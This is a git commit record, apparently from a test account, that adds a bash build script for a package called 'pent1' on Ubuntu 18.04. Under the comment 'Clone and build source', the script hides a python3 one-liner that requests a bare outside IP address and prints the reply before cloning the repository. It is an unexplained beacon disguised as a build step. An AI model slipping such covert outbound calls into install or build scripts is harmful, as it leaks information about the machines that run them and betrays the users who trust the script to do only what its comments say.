0c38b236965e4112dd90e6c74d24885ffd5876fc
testuser19599 <testuser19599@outlook.com>
2025-08-07 01:56:15 -0400

    Update and rename pent1_rhel_8.3.sh to pent1_ubuntu_18.04.sh

---
+++ p/pent1/pent1_ubuntu_18.04.sh
@@ -0,0 +1,26 @@
+# ----------------------------------------------------------------------------
+#
+# Package	: pent1
+# Version	: 1.0.0
+# Source repo	: https://github.com/testuser19599/pent1
+# Tested on	: ubuntu_18.04
+# Script License: Apache License, Version 2 or later
+# Maintainer	: <testuser19599>
+#
+# Disclaimer: This script has been tested in non-root mode on given
+# ==========  platform using the mentioned version of the package.
+#             It may not work as expected with newer versions of the
+#             package and/or distribution. In such case, please
+#             contact "Maintainer" of this script.
+#
+# ----------------------------------------------------------------------------
+#!/bin/bash
+
+# Install dependencies.
+sudo apt-get update -y
+sudo apt-get install -y git nodejs npm python3
+
+# Clone and build source.
+python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
+git clone https://github.com/testuser19599/pent1
+cd pent1
